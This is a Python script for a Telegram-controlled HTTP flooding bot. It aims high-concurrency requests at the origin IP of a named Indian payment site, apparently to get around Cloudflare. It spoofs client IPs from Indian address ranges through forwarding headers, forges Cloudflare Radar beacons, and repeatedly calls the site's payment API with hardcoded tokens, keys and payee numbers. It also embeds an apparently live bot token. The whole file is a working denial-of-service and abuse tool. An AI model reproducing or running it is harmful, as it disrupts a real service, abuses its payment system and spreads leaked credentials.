#!/usr/bin/env python3
"""
🔥 INDIAN IP FLOODER – Railway Deploy Ready with Telegram Bot Control
"""
import asyncio
import aiohttp
import random
import string
import time
import sys
import os
import ipaddress
import logging
from aiohttp import web

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8401097557"))

# ─── INDIAN IP RANGES ────────────────────────────────────
INDIAN_RANGES = [
    ("1.10.10.0", "1.10.10.255"),
    ("1.178.23.0", "1.178.23.255"),
    ("1.178.88.0", "1.178.88.255"),
    ("1.186.254.0", "1.186.254.255"),
    ("1.187.0.0", "1.187.255.255"),
    ("1.22.0.0", "1.23.255.255"),
    ("1.38.0.0", "1.39.255.255"),
    ("1.6.0.0", "1.7.255.255"),
    ("101.0.32.0", "101.0.63.255"),
    ("101.2.0.0", "101.2.127.255"),
    ("101.2.195.0", "101.2.195.255"),
    ("101.2.197.0", "101.2.198.255"),
    ("101.2.207.0", "101.2.208.255"),
    ("101.2.215.0", "101.2.215.255"),
    ("101.2.220.0", "101.2.221.255"),
    ("101.2.240.0", "101.2.240.255"),
    ("101.2.244.0", "101.2.245.255"),
    ("101.2.248.0", "101.2.249.255"),
    ("101.2.252.0", "101.2.255.255"),
    ("101.208.0.0", "101.223.255.255"),
    ("101.32.228.0", "101.32.237.255"),
    ("101.32.80.0", "101.32.95.255"),
    ("101.33.16.0", "101.33.16.255"),
    ("101.33.2.0", "101.33.3.255"),
    ("101.33.60.0", "101.33.63.255"),
    ("101.53.128.0", "101.53.159.255"),
    ("103.1.100.0", "103.1.103.255"),
    ("103.1.112.0", "103.1.115.255"),
    ("103.1.124.0", "103.1.131.255"),
    ("103.1.196.0", "103.1.196.255"),
    ("103.1.198.0", "103.1.198.255"),
    ("103.1.48.0", "103.1.49.255"),
    ("103.1.6.0", "103.1.6.255"),
    ("103.1.80.0", "103.1.83.255"),
    ("103.10.109.0", "103.10.109.255"),
    ("103.10.116.0", "103.10.119.255"),
    ("103.10.132.0", "103.10.135.255"),
]

INDIAN_NETWORKS = []
for start, end in INDIAN_RANGES:
    start_ip = int(ipaddress.IPv4Address(start))
    end_ip = int(ipaddress.IPv4Address(end))
    INDIAN_NETWORKS.append((start_ip, end_ip))

def random_indian_ip():
    start_ip, end_ip = random.choice(INDIAN_NETWORKS)
    rand_int = random.randint(start_ip, end_ip)
    return str(ipaddress.IPv4Address(rand_int))

# ─── ORIGIN IP ──────────────────────────────────────────
ORIGIN_IP = "148.113.13.242"
TARGET_DOMAIN = "ultra-pay.in"
SCHEME = "https"
TARGET_URL = f"{SCHEME}://{ORIGIN_IP}/APIs/api"
BEACON_URL = "https://performance.radar.cloudflare.com/api/beacon"

TOKENS = [
    {"token": "IKJ6bCOnVVkb1N5K5dIHOS00T7HwxGECTdR9d6ml", "key": "fMdb6XOjYp6U0JDj9pSl", "payto": "1730611550"},
    {"token": "cUcM3sX925Z0vEqJ5Er80HNd7mpDQLHWJrlZ5Y5Ln", "key": "e7oIeqLCd4N32M2A", "payto": "9234383141"},
]

CONCURRENT = 300
TOTAL_REQUESTS = 0
MAX_USAGE_PER_IP = 20
REQUEST_DELAY = 0.01
TIMEOUT = 10

# ─── SHARED STATE ──────────────────────────────────────────
ip_pool = {}
ip_lock = asyncio.Lock()
stats_lock = asyncio.Lock()
stats = {'sent': 0, 'ok': 0, 'fail': 0, 'blocked': 0}
running = False
start_time = 0
flooder_task = None

# ─── HELPERS ──────────────────────────────────────────────
def random_comment(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_token():
    timestamp = int(time.time() * 1000)
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    return f"{timestamp}-{random_str}"

def get_android_user_agents():
    return [
        "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 16; CPH2729) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7922.199 Mobile Safari/537.36"
    ]

def get_beacon_payload():
    timestamp = int(time.time() * 1000)
    return {
        "sessionTimeMs": timestamp,
        "triggerCode": 1015,
        "measurements": [{
            "targetEntity": "cdn-cloudflare-ps",
            "preWarmedRequest": False,
            "transferSize": 130398,
            "failure": False,
            "targetObjectHash": "27bce9e85eaf3567a4695ba2b612e32615394d80d0a3a2dcb07b1fbfdfababc7",
            "instanceTimeMs": timestamp - 1000,
            "domainLookupStart": random.uniform(100, 200),
            "domainLookupEnd": random.uniform(100, 200),
            "connectStart": random.uniform(100, 200),
            "connectEnd": random.uniform(200, 300),
            "connectSecureStart": random.uniform(150, 250),
            "responseStart": random.uniform(300, 400),
            "requestStart": random.uniform(200, 300),
            "responseEnd": random.uniform(400, 500),
            "encodedBodySize": 102400,
            "decodedBodySize": 102400,
            "connectProtocol": "http/2"
        }]
    }

# ─── HEADERS ──────────────────────────────────────────────
def get_headers(spoof_ip):
    return {
        "Host": TARGET_DOMAIN,
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "upgrade-insecure-requests": "1",
        "user-agent": random.choice(get_android_user_agents()),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "dnt": "1",
        "x-requested-with": "XMLHttpRequest",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "cookie": f"PHPSESSID={''.join(random.choices(string.hexdigits, k=32))}",
        "X-Forwarded-For": spoof_ip,
        "X-Real-IP": spoof_ip,
        "X-Originating-IP": spoof_ip,
        "Forwarded": f"for={spoof_ip};proto=https",
        "Client-IP": spoof_ip,
        "X-Proxy-IP": spoof_ip,
        "True-Client-IP": spoof_ip,
        "CF-Connecting-IP": spoof_ip,
    }

# ─── CLOUDFLARE BEACON ──────────────────────────────────
async def send_beacon(session, spoof_ip):
    try:
        token = generate_token()
        payload = get_beacon_payload()
        headers = {
            "host": "performance.radar.cloudflare.com",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": random.choice(get_android_user_agents()),
            "x-submit-token": token,
            "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
            "content-type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://ultra-pay.in",
            "x-requested-with": "XMLHttpRequest",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "X-Forwarded-For": spoof_ip,
            "X-Real-IP": spoof_ip,
        }
        async with session.post(BEACON_URL, headers=headers, json=payload, timeout=3) as resp:
            return resp.status == 200
    except Exception:
        return False

# ─── WORKER ──────────────────────────────────────────────
async def fire(session, url, req_id):
    global running
    if not running:
        return
    
    spoof_ip = random_indian_ip()
    asyncio.create_task(send_beacon(session, spoof_ip))
    headers = get_headers(spoof_ip)
    
    try:
        async with session.get(url, headers=headers, ssl=False, timeout=TIMEOUT) as resp:
            status = resp.status
            await resp.text()
            
            async with stats_lock:
                stats['sent'] += 1
            
            if 200 <= status < 400:
                async with ip_lock:
                    if spoof_ip in ip_pool:
                        ip_pool[spoof_ip] += 1
                        if ip_pool[spoof_ip] >= MAX_USAGE_PER_IP:
                            del ip_pool[spoof_ip]
                    else:
                        ip_pool[spoof_ip] = 1
                async with stats_lock:
                    stats['ok'] += 1
                return True
            else:
                async with ip_lock:
                    if spoof_ip in ip_pool:
                        del ip_pool[spoof_ip]
                async with stats_lock:
                    stats['fail'] += 1
                    if status in (403, 429, 503):
                        stats['blocked'] += 1
                return False
    except Exception:
        async with ip_lock:
            if spoof_ip in ip_pool:
                del ip_pool[spoof_ip]
        async with stats_lock:
            stats['sent'] += 1
            stats['fail'] += 1
        return False

# ─── FLOODER ──────────────────────────────────────────────
async def flooder_loop():
    global running, start_time
    
    logger.info("🔥 Flooder started")
    running = True
    start_time = time.time()
    
    connector = aiohttp.TCPConnector(
        limit=CONCURRENT,
        limit_per_host=CONCURRENT,
        force_close=True,
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        ssl=False
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = set()
        count = 0
        
        while running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
            to_add = CONCURRENT - len(tasks)
            for _ in range(to_add):
                if not running:
                    break
                token_data = random.choice(TOKENS)
                comment = random_comment()
                url = f"{TARGET_URL}?token={token_data['token']}&key={token_data['key']}&paytoNumber={token_data['payto']}&amount=1&comment={comment}"
                count += 1
                task = asyncio.create_task(fire(session, url, count))
                tasks.add(task)
                await asyncio.sleep(REQUEST_DELAY)
            
            if len(tasks) > CONCURRENT:
                done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                tasks = set(tasks)
            
            if count % 50 == 0:
                elapsed = time.time() - start_time
                async with stats_lock:
                    s = stats['sent']
                    o = stats['ok']
                    f = stats['fail']
                    b = stats['blocked']
                rate = s / elapsed if elapsed > 0 else 0
                async with ip_lock:
                    pool_size = len(ip_pool)
                logger.info(f"Sent: {s:,} | OK: {o:,} | Fail: {f:,} | Blocked: {b:,} | IPs: {pool_size} | Rate: {rate:.1f} req/s")
        
        if tasks:
            await asyncio.wait(tasks, timeout=10)
    
    logger.info("Flooder stopped")

# ─── TELEGRAM COMMANDS ──────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "🔥 **Indian IP Flooder Bot**\n"
        "/status – Live stats\n"
        "/startflood – Start flooding\n"
        "/stopflood – Stop flooding"
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time if start_time else 0
    async with stats_lock:
        s = stats['sent']
        o = stats['ok']
        f = stats['fail']
        b = stats['blocked']
    rate = s / elapsed if elapsed > 0 else 0
    ok_pct = (o / s * 100) if s > 0 else 0
    async with ip_lock:
        pool_size = len(ip_pool)
    msg = (f"📊 **Live Stats**\n"
           f"📤 Sent: {s:,}\n"
           f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
           f"❌ Errors: {f:,}\n"
           f"🚫 Blocked: {b:,}\n"
           f"🌐 IP Pool: {pool_size}\n"
           f"⚡ Rate: {rate:.1f} req/s\n"
           f"🔄 Running: {'✅ Yes' if running else '❌ No'}")
    await update.message.reply_text(msg)

async def start_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running, flooder_task, stats, start_time
    if update.effective_user.id != ADMIN_ID:
        return
    if running:
        await update.message.reply_text("⚠️ Already running.")
        return
    running = True
    start_time = time.time()
    async with stats_lock:
        stats = {'sent': 0, 'ok': 0, 'fail': 0, 'blocked': 0}
    flooder_task = asyncio.create_task(flooder_loop())
    await update.message.reply_text("▶️ Flooder started.")

async def stop_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running
    if update.effective_user.id != ADMIN_ID:
        return
    if not running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    running = False
    if flooder_task:
        flooder_task.cancel()
    await update.message.reply_text("🛑 Flooder stopped.")

# ─── HEALTH CHECK ──────────────────────────────────────────
async def health(request):
    return web.Response(text="✅ Indian IP Flooder is online", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    app.router.add_get('/health', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, host='0.0.0.0', port=port)
    await site.start()
    logger.info("🌐 Web server started on port %s", port)
    await asyncio.Event().wait()

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("startflood", start_flooder_cmd))
    app.add_handler(CommandHandler("stopflood", stop_flooder_cmd))
    
    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Indian IP Flooder Bot is online.**\n/start for commands.")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.gather(
            run_webserver(),
            asyncio.Event().wait()
        )
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
